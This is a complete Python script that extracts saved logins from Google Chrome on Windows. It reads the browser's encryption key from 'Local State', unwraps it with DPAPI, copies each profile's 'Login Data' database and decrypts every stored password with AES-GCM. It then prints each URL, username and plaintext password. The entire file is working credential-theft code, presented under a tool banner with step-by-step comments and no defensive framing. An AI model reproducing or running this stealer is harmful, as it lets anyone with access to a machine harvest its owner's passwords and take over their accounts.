# Import of needed libraries
import os,re,json,base64,shutil,sqlite3,win32crypt
from Crypto.Cipher import AES

# Localising the 'Local State' file on the user's PC - This file contains the encryption key and passwords.
LOCALSTATE_FilePath = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
USER_PROFILE_CHROME = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

# Step 1
# Retrieving encryption key from Local State - Local State follows the JSON format
def retrieveEncryptionKey():
    try:
        # Step number 1 - Get the encryption key - AES Symmetrical Ke
        with open(LOCALSTATE_FilePath, "r", encoding='utf-8') as fileread:
            localState_File = fileread.read() # Opens the file to read it
            localState_File = json.loads(localState_File) # Loads the JSON Arrays
        encryptionKey = base64.b64decode(localState_File["os_crypt"]["encrypted_key"]) # They key is in Base64

        encryptionKey = encryptionKey[5:] 
        encryptionKey = win32crypt.CryptUnprotectData(encryptionKey, None, None, None, 0)[1]
        return encryptionKey
    
    except Exception as e:
        print("404 - Key not found")
        return None


def cphr_gnrt(key, iv):
    return AES.new(key, AES.MODE_GCM, iv)

def pload_decryptor(cipher, payload):
    return cipher.decrypt(payload)

# Step 0
# CMD UI - User scenario starts here
if __name__ == '__main__':
    try:
            print('''  
  _____   _  __        _     
 |  __ \ | |/ /       | |    
 | |  | || ' /   ___  | |__  
 | |  | ||  <   / _ \ | '_ \ 
 | |__| || . \ | (_) || |_) |
 |_____/ |_|\_\ \___/ |_.__/ ''')
            
            # Step number 1 - Get the encryption key - AES Symmetrical Key
            enc_key = retrieveEncryptionKey()

            # Step number 2 - Locate User profile
            usrProfileFolder = [element for element in os.listdir(USER_PROFILE_CHROME) if re.search("^Profile*|^Default$",element)!=None]
            for folder in usrProfileFolder:

            	# Step number 3 - Get the ciphertext for decryption from the DB
                chrome_user_DB = os.path.normpath(r"%s\%s\Login Data"%(USER_PROFILE_CHROME,folder))
                try:
                    shutil.copy2(chrome_user_DB, "tmp_DB.db")
                    connex = sqlite3.connect("tmp_DB.db")
                except Exception as e:
                    print(e)
                    print("404 - Chrome DB not found")

                # Only proceed if key is present and CNX is established
                if(enc_key and connex):
                    pointer = connex.cursor()
                    pointer.execute("SELECT action_url, username_value, password_value FROM logins")
                    
                    for index,login in enumerate(pointer.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        
                        if(url!="" and username!="" and ciphertext!=""):
                            try:
                                 initialisation_vector = ciphertext[3:15] # Extract IV from ciphertext
                                 encrypted_password = ciphertext[15:-16] # Extract pwd from ciphertext
                                 cipher = cphr_gnrt(enc_key, initialisation_vector)
                                 decrypted_pass = pload_decryptor(cipher, encrypted_password)
                                 decrypted_pass = decrypted_pass.decode()
                            except Exception as e:
                                 print("Decrypt Error")
                                 
                            decrypted_password = decrypted_pass
                            print("")
                            print("URL: %s\nUsername: %s\nPassword: %s\n"%(url,username,decrypted_password))
                            print("-"*40)
                            print("")
                            
                            
                    # DB cnx close
                    pointer.close()
                    connex.close()
                    os.remove("tmp_DB.db")
                    
    except Exception as e:
        print("Error: %s"%str(e))
